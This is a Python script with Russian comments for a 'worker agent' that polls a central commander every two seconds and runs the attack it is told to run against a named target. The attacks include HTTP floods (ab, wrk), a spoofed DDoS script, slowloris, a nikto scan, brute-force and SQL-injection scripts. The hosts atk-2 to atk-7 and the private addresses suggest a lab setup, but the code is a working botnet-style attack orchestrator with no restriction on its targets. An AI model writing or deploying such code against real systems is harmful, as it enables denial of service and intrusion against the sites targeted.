"""
WORKER AGENT — запускается на atk-2 … atk-7.
Каждые 2 секунды опрашивает командера, получает текущую атаку и выполняет её.
Не требует ручного управления — всё управляется через Commander.

Запуск:
  COMMANDER_IP=192.168.10.2 python3 agent.py
"""

import os
import time
import socket
import subprocess
import threading
import logging
import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s [worker] %(message)s")
logger = logging.getLogger("worker")

COMMANDER_IP   = os.getenv("COMMANDER_IP", "192.168.10.2")
COMMANDER_PORT = int(os.getenv("CMD_PORT", 5000))
COMMANDER_URL  = f"http://{COMMANDER_IP}:{COMMANDER_PORT}"
POLL_INTERVAL  = 2   # секунды

WORKER_ID = f"worker-{socket.gethostname()}"
MY_IP     = socket.gethostbyname(socket.gethostname())

current_proc  = None
current_attack = None
lock = threading.Lock()


# ─── Скрипты атак ─────────────────────────────────────────────────────────────
def get_attack_cmd(attack_type: str, target: str) -> list:
    cmds = {
        "flood":     ["ab", "-n", "100000", "-c", "200", "-q", f"http://{target}/"],
        "ddos":      ["python3", "/app/attacks/ddos_spoof.py", target],
        "scan":      ["nikto", "-h", f"http://{target}", "-maxtime", "90s", "-quiet"],
        "brute":     ["python3", "/app/attacks/brute.py", target],
        "sqli":      ["python3", "/app/attacks/sqli.py", target],
        "slowloris": ["python3", "/app/attacks/slowloris.py", target],
        "flash":     ["wrk", "-t4", "-c30", "-d60s", f"http://{target}/"],
        "slow":      ["wrk", "-t2", "-c15", "-d60s", f"http://{target}/search"],
    }
    return cmds.get(attack_type, ["ab", "-n", "10000", "-c", "50", "-q", f"http://{target}/"])


def start_attack(attack_type: str, target: str):
    global current_proc, current_attack
    with lock:
        if current_proc and current_proc.poll() is None:
            current_proc.terminate()
            current_proc.wait()
        cmd = get_attack_cmd(attack_type, target)
        logger.info(f"Запускаю атаку: {attack_type} → {target}")
        try:
            current_proc   = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            current_attack = attack_type
        except FileNotFoundError as e:
            logger.error(f"Инструмент не найден: {e}")
            current_proc = None


def stop_attack():
    global current_proc, current_attack
    with lock:
        if current_proc and current_proc.poll() is None:
            current_proc.terminate()
            current_proc.wait()
            logger.info("Атака остановлена")
        current_proc   = None
        current_attack = None


# ─── Главный цикл ─────────────────────────────────────────────────────────────
def poll_commander():
    global current_attack

    while True:
        try:
            status = "attacking" if (current_proc and current_proc.poll() is None) else "idle"

            r = requests.post(
                f"{COMMANDER_URL}/worker/heartbeat",
                json={"worker_id": WORKER_ID, "ip": MY_IP, "status": status},
                timeout=3,
            )
            cmd = r.json()

            attack_active  = cmd.get("attack_active",  False)
            attack_type    = cmd.get("current_attack", None)
            target         = cmd.get("target",         "")

            if attack_active and attack_type and target:
                # Начать атаку если не та или не запущена
                if attack_type != current_attack or (current_proc and current_proc.poll() is not None):
                    start_attack(attack_type, target)
            else:
                # Атака отменена
                if current_attack is not None:
                    stop_attack()

        except requests.exceptions.ConnectionError:
            logger.warning(f"Командер недоступен ({COMMANDER_URL}), жду...")
        except Exception as e:
            logger.error(f"Ошибка: {e}")

        time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    logger.info(f"Worker {WORKER_ID} ({MY_IP}) → командер {COMMANDER_URL}")
    poll_commander()
